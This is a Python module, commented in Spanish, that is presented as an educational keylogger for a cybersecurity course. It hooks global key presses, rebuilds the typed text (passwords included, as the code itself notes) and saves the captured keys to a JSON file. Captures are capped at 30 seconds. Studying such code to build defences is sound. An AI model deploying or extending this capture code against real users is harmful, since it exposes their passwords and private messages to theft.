"""
Módulo de Keylogger Educativo
Utiliza la librería 'keyboard' para capturar las pulsaciones de teclas.

NOTA EDUCATIVA: Para poder diseñar un anti-keylogger es necesario entender
cómo funciona un keylogger con la finalidad de tener mayor seguridad
en la red digital.

Este módulo es EXCLUSIVAMENTE con fines educativos para la materia de
Ciberseguridad. El uso indebido de keyloggers es ilegal.
"""

import keyboard
from datetime import datetime
import threading
import os
import json


class Keylogger:
    """
    Keylogger educativo que registra pulsaciones de teclas.
    Demuestra cómo un atacante puede capturar todo lo que escribe
    un usuario, incluyendo contraseñas, mensajes, etc.
    """
    
    def __init__(self):
        self.keys_log = []
        self.is_running = False
        self.start_time = None
        self.hook = None
    
    def _on_key_event(self, event):
        """Callback cuando se presiona una tecla."""
        if event.event_type == 'down':
            key_info = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'key': event.name,
                'key_code': event.scan_code,
                'type': self._classify_key(event.name)
            }
            self.keys_log.append(key_info)
    
    def _classify_key(self, key_name):
        """Clasifica el tipo de tecla capturada."""
        special_keys = {
            'space': 'espacio', 'enter': 'enter', 'tab': 'tabulación',
            'backspace': 'borrar', 'delete': 'suprimir', 'escape': 'escape',
            'shift': 'modificador', 'ctrl': 'modificador', 'alt': 'modificador',
            'caps lock': 'modificador', 'left shift': 'modificador',
            'right shift': 'modificador', 'left ctrl': 'modificador',
            'right ctrl': 'modificador', 'left alt': 'modificador',
            'right alt': 'modificador', 'left windows': 'modificador',
            'right windows': 'modificador',
            'up': 'navegación', 'down': 'navegación',
            'left': 'navegación', 'right': 'navegación',
            'home': 'navegación', 'end': 'navegación',
            'page up': 'navegación', 'page down': 'navegación',
        }
        
        if key_name in special_keys:
            return special_keys[key_name]
        
        # Teclas de función
        if key_name.startswith('f') and key_name[1:].isdigit():
            return 'función'
        
        # Caracteres normales (letras, números, símbolos)
        if len(key_name) == 1:
            if key_name.isalpha():
                return 'letra'
            elif key_name.isdigit():
                return 'número'
            else:
                return 'símbolo'
        
        return 'especial'
    
    def start(self, duration=10):
        """
        Inicia la captura de teclas por un tiempo limitado.
        
        Args:
            duration: Duración máxima en segundos (máx 30)
        """
        if self.is_running:
            return {'success': False, 'error': 'El keylogger ya está en ejecución.'}
        
        if duration < 1:
            return {'success': False, 'error': 'La duración mínima es 1 segundo.'}
        if duration > 30:
            duration = 30
        
        self.keys_log = []
        self.is_running = True
        self.start_time = datetime.now()
        
        try:
            # Evento para controlar la duración de la captura
            stop_event = threading.Event()

            # Registrar el hook de teclado
            keyboard.on_press(self._on_key_event)

            # Esperar la duración indicada mediante un timer
            timer = threading.Timer(duration, stop_event.set)
            timer.start()
            stop_event.wait()
            timer.cancel()

            # Detener captura
            keyboard.unhook_all()
            self.is_running = False
            
            # Reconstruir el texto capturado
            captured_text = self._reconstruct_text()
            stats = self._generate_stats()
            
            return {
                'success': True,
                'keys': self.keys_log,
                'total_keys': len(self.keys_log),
                'duration': duration,
                'captured_text': captured_text,
                'stats': stats
            }
            
        except Exception as e:
            keyboard.unhook_all()
            self.is_running = False
            return {
                'success': False,
                'error': f'Error en el keylogger: {str(e)}'
            }
    
    def stop(self):
        """Detiene la captura de teclas."""
        if self.is_running:
            keyboard.unhook_all()
            self.is_running = False
            return {'success': True, 'message': 'Keylogger detenido.'}
        return {'success': False, 'error': 'El keylogger no está en ejecución.'}
    
    def _reconstruct_text(self):
        """
        Reconstruye el texto que escribió el usuario a partir de las teclas.
        Esto demuestra lo peligroso de un keylogger: puede reconstruir
        contraseñas, mensajes, y toda la información escrita.
        """
        text = ''
        for key in self.keys_log:
            name = key['key']
            if name == 'space':
                text += ' '
            elif name == 'enter':
                text += '\n'
            elif name == 'backspace':
                text = text[:-1] if text else ''
            elif name == 'tab':
                text += '\t'
            elif key['type'] in ('letra', 'número', 'símbolo'):
                text += name
            # Ignorar teclas modificadoras, navegación, etc.
        
        return text
    
    def _generate_stats(self):
        """Genera estadísticas de las teclas capturadas."""
        total = len(self.keys_log)
        types = {}
        for key in self.keys_log:
            t = key['type']
            types[t] = types.get(t, 0) + 1
        
        return {
            'total': total,
            'types': types,
            'letters': types.get('letra', 0),
            'numbers': types.get('número', 0),
            'symbols': types.get('símbolo', 0),
            'special': total - types.get('letra', 0) - types.get('número', 0) - types.get('símbolo', 0)
        }
    
    def save_log(self, filepath, keys, captured_text=''):
        """Guarda el registro de teclas en un archivo JSON."""
        try:
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
            
            log_data = {
                'capture_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_keys': len(keys),
                'captured_text': captured_text,
                'warning': 'Este archivo es solo para fines educativos de Ciberseguridad',
                'keys': keys
            }
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(log_data, f, indent=2, ensure_ascii=False)
            
            return {
                'success': True,
                'filepath': os.path.abspath(filepath),
                'total_saved': len(keys)
            }
        except PermissionError:
            return {
                'success': False,
                'error': f'Sin permisos para escribir en: {filepath}'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Error al guardar: {str(e)}'
            }


# Instancia global
keylogger = Keylogger()